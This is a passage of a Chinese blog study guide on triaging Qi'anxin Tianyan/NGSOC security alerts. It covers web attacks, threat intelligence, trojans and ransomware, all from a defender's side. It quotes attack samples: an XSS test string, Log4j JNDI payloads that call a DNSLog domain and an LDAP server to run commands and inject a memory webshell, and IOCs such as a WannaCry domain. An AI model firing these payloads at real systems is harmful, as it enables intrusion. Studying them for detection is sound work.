邮件包头中的邮件发送&#x2F;接收时间\nfrom 邮件发送人 来自于邮件头相应字段\nto 邮件接收人 来自于邮件头相应字段\ncc 邮件抄送人 来自于邮件头相应字段\nsubject 主题 来自于邮件头相应字段\nreferences 被当前邮件回复的邮件ID 来自于邮件头相应字段\nattach_name 附件名字 来自于邮件头相应字段\nattach_md5 附件md5 来自于邮件头相应字段\nmime_type 附件mime_type（字典库） 来自于邮件头相应字段\nplain 邮件正文 来自于邮件头相应字段</code></pre>\n\n<h3 id=\"数据库操作\"><a href=\"#数据库操作\" class=\"headerlink\" title=\"数据库操作\"></a>数据库操作</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">\nproto 数据库应用协议 根据报文中得到的协议字段转\n为可读的字符串；tds:mssql；\ntns:oracle；mysql:mysql；\npostgresql：postgresql\nversion 协议版本 协议的版本号\nuser 用户 报文提取\ndb_name 数据库 报文提取\ndb_type 数据库类型 mssql，oracle，mysql，\npostgresql四个值\nret_code 数据库操作返回的状态信息 sql语句执行的结果，Success或\n具体的失败信息\nsql_info 操作信息 报文提取的sql语句</code></pre>\n\n<h2 id=\"天眼告警监测分析-重点2\"><a href=\"#天眼告警监测分析-重点2\" class=\"headerlink\" title=\"天眼告警监测分析(重点2)\"></a>天眼告警监测分析(重点2)</h2><h3 id=\"分类目录\"><a href=\"#分类目录\" class=\"headerlink\" title=\"分类目录\"></a>分类目录</h3><p><strong>web攻击集合</strong></p>\n<ol>\n<li>信息泄露</li>\n<li>弱口令</li>\n<li>XSS攻击</li>\n<li>SQL注入</li>\n<li>文件上传</li>\n<li>文件包含</li>\n<li>Webshell</li>\n<li>命令执行</li>\n<li>XML实体注入</li>\n</ol>\n<p><strong>威胁情报集合</strong></p>\n<ol>\n<li>木马远控</li>\n<li>挖矿木马</li>\n<li>勒索病毒</li>\n<li>僵尸网络</li>\n<li>黑市工具等</li>\n</ol>\n<h3 id=\"Web攻击\"><a href=\"#Web攻击\" class=\"headerlink\" title=\"Web攻击\"></a>Web攻击</h3><p><strong>信息泄露</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">敏感数据包括但不限于：口令、密钥、证书\n、会话标识、License、隐私数据(如短消息的内\n容)、授权凭据、个人数据(如姓名、住址、电话\n等)等，在程序文件、配置文件、日志文件、备份\n文件及数据库中都有可能包含敏感数据。</code></pre>\n\n<p><strong>信息泄露——备份文件</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">漏洞影响： 可能导致网站敏感信息泄露，被利用来进一步攻击等危害。\nURI中“1.zip”触发规则告警，访问URI地址，下载备份文件，分析备份文件，判断漏洞影响。\n修复建议： 删除该网站目录下的备份文件</code></pre>\n\n<p><strong>信息泄露——自动目录列表</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">漏洞影响： 任何人可以访问该路下的文件，可能造成敏感信息泄露\n响应体中“Directory”触发规则告警，访问URI地址下目录文件，分析目录信息，判断漏洞影响。\n修复建议： 修改配置文件，禁止目录列表列出</code></pre>\n\n<p><strong>信息泄露——目录穿越</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">漏洞影响： 利用此漏洞，黑客可以发现一些敏感信息，包括读取服务器敏感文件等。\n请求头..&#x2F;..&#x2F;触发规则告警，\n修复建议： 禁止目录遍历，对输入参数过滤..&#x2F;等字符。</code></pre>\n\n<p><strong>信息泄露——.svn源码泄露</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">漏洞影响： 攻击利用该漏洞，可以获取到服务器源码、svn服务器账号密码等信息。\nURI“&#x2F;.svn&#x2F;entries”与响应体svn信息触发规则告警。\n修复建议： 禁止或删除.svn文件浏览</code></pre>\n\n<p><strong>弱口令</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">密码过于简单，不满足复杂度要求；攻击\n者通过穷举方法尝试web登录的帐号名与密码。\n密码复杂度要求：口令长度不得小于 8 位，\n且为数字、字母、字符混合组合，用户名和口令\n不得相同，且无明显规律</code></pre>\n\n<p><strong>弱口令——字典</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">常见的弱口令字典有默认型弱口令字典和社工型弱口令字典\n默认型的弱口令\n? 系统服务弱口令\n? 应用组件弱口令\n? 设备弱口令</code></pre>\n\n<p><strong>弱口令——web弱口令</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">漏洞影响： 弱口令容易被人猜解，造成个人信息等数据丢失严重者可导致网站被攻陷。\n请求体中“password&#x3D;123456”弱口令，服务器返回“success”</code></pre>\n\n<p><strong>弱口令——中间件tomcat弱口令</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">漏洞危害： 通过弱口令进入中间件后台可直接部署war包getshell\n中间件例如tomcat与basic认证弱口令信息在请求头Authorization字段中，可用base64进行解码</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">暴力破解法，或称为穷举法，是一种针对于密码的破译方法。在一些领域，为了提高密码的破译效率而专\n门为其制造的超级计算机。例如，IBM为美国军方制造的“飓风”就是很有代表性的一个。破解任何一个密码\n也都只是一个时间问题。\n弱口令案例：</code></pre>\n\n<p><strong>弱口令——暴力猜解</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">攻击者在短时间内通过穷举帐号名与密码的方法尝试web登录，看到暴力猜解的告警要结合流量日志分析溯源判断是否爆破成功。</code></pre>\n\n<p><strong>弱口令——暴力猜解分析技巧</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">**①HTTP登陆爆破，协议类型web日志**\nsip:(“攻击IP”) AND dip:(“受攻击系统IP”) AND data:(“登陆请求账号字段”)\n**②FTP、SMTP、Telnet、SSH、mysql数据库等登陆爆破，协议登陆动作**\nsip:(“攻击IP”) AND dip:(“受攻击系统IP”) AND proto:(“爆破协议”)\n**③过滤爆破登陆成功**\nsip:(“攻击IP”) AND dip:(“受攻击系统IP”) AND proto:(“爆破协议”) AND NOT (info:fail* OR info:530)</code></pre>\n\n<p><strong>XSS</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">恶意攻击者往Web页面里插入恶意代码，当\n用户浏览该页之时，嵌入其中Web里面的js代码\n会被执行，从而达到恶意攻击用户的特殊目的 。\n利用xss 可 以 盗 取 用 户 cookie 、 xss 结合\nwindows 10 系统BadCon漏洞可导致系统蓝屏</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">请求头“&lt;script&gt;alert(xss)&lt;&#x2F;script&gt;”与响应体“&lt;script&gt;alert(xsss)&lt;&#x2F;script&gt;”触发规则告警</code></pre>\n\n<p><strong>跨站攻击-分析技巧</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">1 、如果遇到跨站响应数据比较多，可以将响应体的数据贴出来放到HTML文件里面打开，观察是否弹窗。\n2 、如果未弹窗，则在浏览器总CTRL+F查找对应未实体化的JS脚本代码，常见的跨站攻击代码如下：\n&#123;[[&lt;script]],[[&lt;a]],[[&lt;div]],[[&lt;img]],[[&lt;iframe]],[[&lt;svg]],[[&lt;body]],[[&lt;audio]],[[&lt;form]],[[&lt;isindex]],[[&lt;input]],[[&lt;marquee]],[\n[&lt;textarea]]&#125;</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">发生于应用程序与数据库层的安全漏洞。\n简而言之，是在输入的字符串之中注入SQL指令，\n在设计不良的程序当中忽略了字符检查，那么这\n些注入进去的恶意指令就会被数据库服务器误认\n为是正常的SQL指令而运行，因此遭到破坏或是\n入侵。</code></pre>\n<p><strong>SQL注入</strong></p>\n<p><strong>SQL注入——union联合查询注入</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">对SQL注入攻击成功Payload进行分析，如果服务器返回相应数据库查询信息，则判断攻击成功。\n发现成功爆出当前数据库用户：root@localhost，SQL注入攻击成功。</code></pre>\n\n<p><strong>SQL注入攻击——布尔盲注</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">根据响应体长度进行分析判断是否注入成功，大多布尔盲注攻击是返回错误页面的，少数是返回正常页面，利用错\n误页面长度与正常页面长度不一致特性进行分析。上面数据包查看数据库用户名对应ascii码值，如果此ascii码值等于\n真正对应用户名母ascii值则返回正常页面，如果不等于则返回错误页面。</code></pre>\n\n<p><strong>SQL注入攻击——时间盲注</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">服务器记录的响应时间和攻击注入的时间函数不一致，则攻击未成功。网站延迟过高也可能会导致告警成功。\n其中，图片中最后部分是分析数据。相关描述如下：\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;sqlblind delay&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nCalculated delay: 3.60966413018 &#x2F;&#x2F;2）根据过去 30 次响应延迟，统计计算出来的延迟\nUsed delay: 3.60966413018 &#x2F;&#x2F;3）根据 2 ）和最低延迟（ 3 秒），取延迟的最大值\nAnalysis delay: 0 &#x2F;&#x2F;4）通过分析请求提取出来的延迟\nUsed retval_result: 3.60966413018 &#x2F;&#x2F;5）最终使用用于比较的延迟时间，Used delay和Analysis delay中的最大值\nCurrent rsptime: 10.137 &#x2F;&#x2F;6）当前响应延迟\nRsp_time_list: [0.156, 0.158, 0.157, 0.16, 0.123, 0.124, 0.121, 0.122, 0.151, 0.159, 0.131, 0.133, 0.144, 0.162, 0.153, 0.119, 0.131, 1.128, 1.106, 1.102, 0.105, 1.111, 1.111, 1.107, 1.106, 1.107, 0.103, 0.106,\n1.106, 0.108] &#x2F;&#x2F;1）过去的 30 次响应延迟\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;sqlblind delay&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</code></pre>\n\n<p><strong>SQL注入——Joomla! SQL注入漏洞</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">通用SQL注入漏洞，大体上也是有回显与无回显，可根据服务器响应信息、响应时间、响应长度进行判断</code></pre>\n\n<p><strong>文件上传</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">任意文件上传漏洞，主要是产生于网站所\n提供的文件上传功能，而由于网站没有严格限制\n文件上传格式，从而导致可上传任意的文件格式，\n特别是脚本木马（webshell）到服务器上，最\n终获得服务器的控制权限。</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">客户端请求数据为PHP菜刀木马，服务器返回信息“success upload”判断webshell上传成功。</code></pre>\n\n<p><strong>文件上传——企图告警分析</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">文件上传企图告警，根据数据包无法判断是否上传成功，可到分析平台查看是否有脚本文件的访问记录，如果有成功访问脚本\n文件记录，则脚本文件上传成功。</code></pre>\n\n<p><strong>文件上传——企图告警分析</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">检索语法，uri:(“webshell文件名”)，如果上传脚本文件被重命名，就筛选出攻击IP对服务器的web协议的访问流\n量进行分析判断。</code></pre>\n\n<p><strong>文件包含</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">文件包含漏洞的产生原因是在通过PHP的\n函数引入文件时，由于传入的文件名没有经过合\n理的校验，从而操作了预想之外的文件，就可能\n导致意外的文件泄露甚至恶意的代码注入。</code></pre>\n\n<p><strong>webshell</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">攻击者在入侵企业网站时，通常要通过各\n种方式获取webshell从而获得企业网站控制权，\n然后方便进行之后的入侵行为，webshell通用\n功能包括但不限于shell命令执行、代码执行、\n数据库枚举和文件管理。</code></pre>\n<p><strong>webshell</strong></p>\n<p><strong>webshell——哥斯拉通信</strong></p>\n<p>哥斯拉是一个基于流量、HTTP全加密的webshell管理工具，所以从报文很难看出有明显的攻击特<br>征，需要结合流量上下文找到哥斯拉webshell上传成功的流量来进行分析和判断。</p>\n<p><strong>webshell——冰蝎</strong></p>\n<p>冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。冰蝎的通信过程可以分为<br>两个阶段：密钥协商、加密传输。</p>\n<p><strong>命令执行</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">命令执行漏洞，用户通过浏览器提交执行命\n令，由于服务器端没有针对执行函数做过滤，导致\n在没有指定绝对路径的情况下就执行命令，可能会\n允许攻击者通过改变 $PATH 或程序执行环境的其\n他方面来执行一个恶意构造的代码。</code></pre>\n\n<p><strong>命令执行——业务系统功能模块</strong></p>\n<p><strong>命令执行——Struts2命令执行</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Struts2代码执行，大多都是在HTTP的请求头或者请求体插入精心构造的恶意代码，如执行echo、print、whoami函数。\ns2- 01 --s2- 057 ，原理可以参考该文章：https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;86757</code></pre>\n\n<p><strong>命令执行——Java框架通用代码执行</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Java通用命令执行成功的告警，有的执行命令的攻击payload不仅在请求头中存在，也会在请求体中存在。</code></pre>\n\n<p><strong>命令执行——SQL漏洞注入执行命令</strong></p>\n<p><strong>XML实体注入</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">XXE全称XML External Entity Injection即\nxml外部实体注入漏洞，触发点多位于xml文件上\n传点。xml实体注入一般可以探测内网、读取系统\n任意文件，任意文件上传等。</code></pre>\n\n\n<p><strong>XML实体注入——基础知识</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自\n己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</code></pre>\n\n<p><strong>XML实体注入——漏洞分类</strong></p>\n<p><strong>XML实体注入——内网存活主机探测</strong></p>\n<p><strong>XML实体注入——任意文件读取</strong></p>\n<p><strong>XML实体注入——文件上传</strong></p>\n<p><strong>XML实体注入——文件上传</strong></p>\n<p><strong>网络攻击</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">发现后门程序njRat 通信行为如何排查:</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">感染了njrat的主机会不断与攻击电脑进\n行连接，访问一个固定端口。\nVHJvamFuX0M0NkY2RTk&#x3D;是他的特征，是\nbase64编码，解码后为Trojan_C46F6E9，\nVHJvamFuX0M0NkY2RTk&#x3D;后面是攻击的命\n令，您可以看一下是否有外连行为，这里没\n有执行其他操作，Win XP：操作系统信息、\n0.6.4：Njrat版本。0.6.4和endof之前的||：\n没有显示，若有内容应为base64编码，是攻\n击者相关行为的说明、endof：结束符。</code></pre>\n\n<p><strong>实操1</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">导入告警流量包：登录天眼流量传感器，策略配置-抓包检测-PCAP文件检测 ， 添加文件后，导入pcap包</code></pre>\n\n<p><strong>实操2</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">天眼告警分析：分析平台发现告警：\n1 、Apache Log4j2 远程代码执行漏洞(CVE- 2021 - 44228&#x2F;CVE- 2021 - 45046)\n2 、DNSLog渗透测试活动事件\n3 、发现利用特定域名带外DNS请求</code></pre>\n\n<p><strong>实操3</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">查看详情发现Apache Log4j2 远程代码执行漏洞恶意payload：\n%24%7Bjndi%3Aldap%3A%2F%2F9w0cao.dnslog.cn%7D</code></pre>\n\n<p><strong>实操4</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">通过解码小助手解密其payload为：$&#123;jndi:ldap:&#x2F;&#x2F;9w0cao.dnslog.cn&#125;，确定这是一个攻击行为。</code></pre>\n\n<p><strong>实操5</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">查看详情-原始告警，分别点击详情，查看其分别执行了命令：whoami，\n解密小助手解密后Payload：$&#123;jndi:ldap:&#x2F;&#x2F;10.43.43.221:1389&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;\n注入内存马：\nPayload：$&#123;jndi:ldap:&#x2F;&#x2F;10.43.43.221:1389&#x2F;TomcatBypass&#x2F;TomcatMemshell2&#125;</code></pre>\n\n<p><strong>实操6</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">来到分析中心-日志检索（选择高级分析-本级-网络日志-web访问）检索语句：uri:(*jndi*)</code></pre>\n\n<p><strong>实操7</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">攻击成功情况：\n1 ，判断dnslog攻击成功：选择域名解析，存在源ip与dnslog.com的外联日志：</code></pre>\n\n<p><strong>实操8</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">攻击成功情况：\n1 ，判断命令执行攻击成功：有回显命令执行：响应体中存在命令执行结果：</code></pre>\n\n<p><strong>实操9</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">攻击成功情况：\n2 ，无回显命令执行：存在源ip与ldap服务ip的外联日志：</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">3 ，判断内存马注入攻击成功：查看此攻击IP是否访问内存马目录，并执行其他操作：例如执行whoami等。</code></pre>\n\n<p><strong>企图类告警要不要看？</strong></p>\n<p>① 企图类告警中也存在部分攻击成功的安全事件，</p>\n<p>② 弱口令告警，由于客户现场开发环境复杂，开发不够规范或者天眼规则没有匹配到成功的相应字段，一些web登陆的弱口令告警中虽然显示企图但已成功登陆，需要认真分析数据包信息或在授权的情况下进行登陆验证</p>\n<p>③ 例如，一个内网地址A自动攻击内网地址B，主机B不存在漏洞没有攻击成功，但是内网主机A已中招</p>\n<p>④ 出现最新的攻击方法时，由于没有及时更新天眼的规则库，会导致一些告警出现企图的告警</p>\n<h3 id=\"威胁情报\"><a href=\"#威胁情报\" class=\"headerlink\" title=\"威胁情报\"></a>威胁情报</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">威胁情报 （Threat Intelligence）是一种基于证据的描述威胁的一组关联的信息，包括威胁相关的环境信息、\n采用的手法机制、指标、影响，以及行动建议等。与传统的单点的病毒或信誉等信息不同，这一系列对于攻击威胁的\n信息，可以让我们了解高级威胁的全貌，并可以被抽象成可机读威胁情报（MRTI），用来进行应对决策，并对威胁\n进行响应。</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">攻击特点 攻击背景\n攻击组织者\n攻击目的\n行业覆盖度\n活跃程度</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">外链URL\n恶意IP\n恶意域名\n样本MD5\n......</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">IOC（Indicator of Compromise）\n失陷指标&#x2F;特征</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">可以反映主机或网络失陷特征信息，这些信息入侵工\n具、恶意软件和攻击组织的属性，如邮箱、域名、IP、\nURL、文件名、文件hash、证书和签名等，简称IOCs。</code></pre>\n\n<p><strong>威胁情报包含IOC</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">僵尸网络\n“一控多”\n勒索病毒\n”勒索赎金“</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">网络蠕虫\n“ 传染能力强 ”</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">木马远控\n“远程控制”</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">黑市工具\n“利用Nday漏洞投递样本”</code></pre>\n\n<p><strong>威胁情报告警分类</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">远控木马\n远控木马一种恶意程序，其中包括在目标计\n算机上用于管理控制的后门。远程访问木马通常\n与用户请求的程序（如游戏程序）一起，是一种\n看不见的下载，或作为电子邮件附件发送。一旦\n主机系统被攻破，入侵者可以利用它来向其他易\n受感染的计算机分发远程访问木马，从而建立僵\n尸网络。</code></pre>\n<p><strong>远控木马</strong></p>\n<p><strong>远控木马——告警分析</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">根据告警的IOC信息查询该威胁情报信息，根据情报提供的相关信息进行行为匹配。</code></pre>\n\n<p><strong>远控木马——告警分析</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">根据情报提供的信息通过天眼进行日志检索，\n1 、不断的解析该域名down.luckyboy.cn\n2 、内网主机请求该域名上的au3.exe文件，命中情报信息。</code></pre>\n\n<p><strong>挖矿木马</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">挖矿木马是一种入侵计算机系统并植入挖矿\n机赚取加密数字货币获利的病毒。</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">矿工网络分成矿机、矿池、钱包等几个主要部分，有时矿池软件与钱包安装在一起，可合称为矿池。</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">常见的挖矿协议：\n? GETWORK\n? Getblocktemplate 协议\n? STRATUM</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">详细可参考：\nhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;\narticle&#x2F;details&#x2F;80082590</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">STRATUM协议</code></pre>\n\n<p><strong>挖矿木马——告警分析</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">根据天眼挖矿木马成功的查看数据包或检索流量日志，分析流量日志中是否存在挖矿流量</code></pre>\n\n<p><strong>勒索病毒</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">勒索病毒，是一种新型电脑病毒，主要以邮\n件、程序木马、网页挂马的形式进行传播。该病\n毒性质恶劣、危害极大，一旦感染将给用户带来\n无法估量的损失。这种病毒利用各种加密算法对\n文件进行加密，被感染者一般无法解密，必须拿\n到解密的私钥才有可能破解。</code></pre>\n\n\n<p><strong>勒索病毒——永恒之蓝病毒</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">了解勒索病毒的特性，攻击方式、传播途径、目的等等</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">例如WannaCry勒索病毒\n? 感染后解析主机主动解析：\nhttp:&#x2F;&#x2F;www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com；\n? 通过 445 端口（smb）利用ms17- 010 漏洞传播；\n? 感染后加密本地文件；\n? 释放本地文件：\nc:\\windows\\mssecsvc.exe、qeriuwjhrf、tasksche.exe；\n? 等等</code></pre>\n\n<p><strong>勒索病毒——告警分析</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">根据勒索病毒的特性进行佐证的收集</code></pre>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">存在大量域名解析； 自身存在ms17- 010 漏洞； 通过 445 端口攻击内网机器；</code></pre>\n\n<p><strong>勒索病毒——修复建议</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">修复建议：\n\n① 通过杀毒系统对当前主机进行全盘扫描并查杀病毒；\n\n② 尽快更新官方最新补丁，参考：\n\n③ https:&#x2F;&#x2F;technet.microsoft.com&#x2F;en-us&#x2F;library&#x2F;security&#x2F;ms17-010.aspx#Vulnerability Information，以及</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">修复主机其它安全漏洞；\n\n④ 关闭135&#x2F;137&#x2F;138&#x2F;139&#x2F;445等端口；\n\n⑤ 关闭网络共享端口；\n\n⑥ 修改主机口令且密码满足复杂度要求（口令长度至少为 8 位，并由数字、大小字母与特殊字符组成）。</code></pre>\n\n<p><strong>勒索病毒——分析技巧</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">如何判断勒索病毒类型\nhttps:&#x2F;&#x2F;lesuobingdu.qianxin.com&#x2F;</code></pre>\n\n<h3 id=\"告警分析小结\"><a href=\"#告警分析小结\" class=\"headerlink\" title=\"告警分析小结\"></a>告警分析小结</h3><p><strong>小结一，情报分析流程</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">确认告警信息\n分析威胁情报\n匹配网络攻击行为\n是否存在交互信息</code></pre>\n\n<p><strong>小结二，只有域名解析主机是否安全？</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">① 可以利用域名解析协议实现SQL注入带外查询（OOB），例如：\n② 可以利用Dnscat2实现DNS隐蔽隧道反弹Shell\nDnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道。</code></pre>\n\n<p><strong>小结三，威胁情报可能产生误报的情况</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">① 防火墙、邮件网关有发起黑域名解析的行为可能是误报\n② 威胁情报可能失效了，这时候需要更新威胁情报</code></pre>\n\n","feature":false,"text":"天眼&amp;NGSOC告警分析天眼使用指南&lt; 分析平台，流量传感器，文件威胁鉴定器 &gt; 新一代安全感知系统：检测，溯源，响应 云端威胁情报： 文件威胁鉴定器静态检测，动态检测 分析平台威胁感知，调查分析，场景化分析 流量传感器入侵攻击检测，威胁情报匹配，文件还原，数...","link":"","photos":[],"count_time":{"symbolsCount":"20k","symbolsTime":"18 mins."},"categories":[{"name":"护网","slug":"护网","count":2,"path":"api/categories/护网.json"}],"tags":[{"name":"护网","slug":"护网","count":2,"path":"api/tags/护网.json"},{"name":"奇安信","slug":"奇安信","count":1,"path":"api/tags/奇安信.json"},{"name":"天眼","slug":"天眼","count":1,"path":"api/tags/天眼.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%A9%E7%9C%BC-amp-NGSOC%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90\"><span class=\"toc-text\">天眼&amp;NGSOC告警分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%A9%E7%9C%BC%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97\"><span class=\"toc-text\">天眼使用指南</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A4%A9%E7%9C%BC%E8%AE%BE%E5%A4%87%E4%BB%8B%E7%BB%8D-%E4%BC%A0%E6%84%9F%E5%99%A8\"><span class=\"toc-text\">天眼设备介绍-传感器</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A4%A9%E7%9C%BC%E8%AE%BE%E5%A4%87%E4%BB%8B%E7%BB%8D-%E5%A4%A9%E7%9C%BC%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0\"><span class=\"toc-text\">天眼设备介绍-天眼分析平台</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A4%A9%E7%9C%BC%E8%AE%BE%E5%A4%87%E4%BB%8B%E7%BB%8D-%E6%96%87%E4%BB%B6%E9%89%B4%E5%AE%9A%E5%99%A8\"><span class=\"toc-text\">天眼设备介绍-文件鉴定器</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%A4%A9%E7%9C%BC%E6%97%A5%E5%BF%97%E6%A3%80%E7%B4%A2%E8%AF%AD%E6%B3%95-%E9%87%8D%E7%82%B91\"><span class=\"toc-text\">天眼日志检索语法(重点1)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8D%8F%E8%AE%AE%E5%AD%97%E6%AE%B5%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">协议字段介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%85%AC%E5%85%B1%E5%AD%97%E6%AE%B5\"><span class=\"toc-text\">网络协议公共字段</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#TCP%E5%8D%8F%E8%AE%AE-amp-UDP\"><span class=\"toc-text\">TCP协议&amp;UDP</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#HTTP%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">HTTP协议</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DNS%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">DNS协议</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSL%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">SSL协议</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">文件传输</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%99%BB%E9%99%86%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">登陆协议</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%82%AE%E4%BB%B6%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">邮件协议</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C\"><span class=\"toc-text\">数据库操作</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 